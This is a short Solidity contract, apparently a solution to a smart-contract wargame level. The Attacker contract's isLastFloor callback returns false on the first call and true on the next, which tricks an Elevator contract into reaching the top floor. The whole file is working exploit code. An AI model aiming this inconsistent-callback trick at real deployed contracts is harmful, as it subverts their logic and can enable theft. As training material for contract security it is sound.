// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator {
    function goTo(uint256 _floor) external;
}

contract Attacker {
    uint c = 0;

    function isLastFloor(uint256 _floor) public returns (bool) {
        _floor;
        if (c == 0) {
            c += 1;
            return false;
        }
        else {
            c = 0;
            return true;
        }
    }
    function GoToLast(address _targetAddress) public {
        Elevator target = Elevator(_targetAddress);
        target.goTo(10);
    }
}
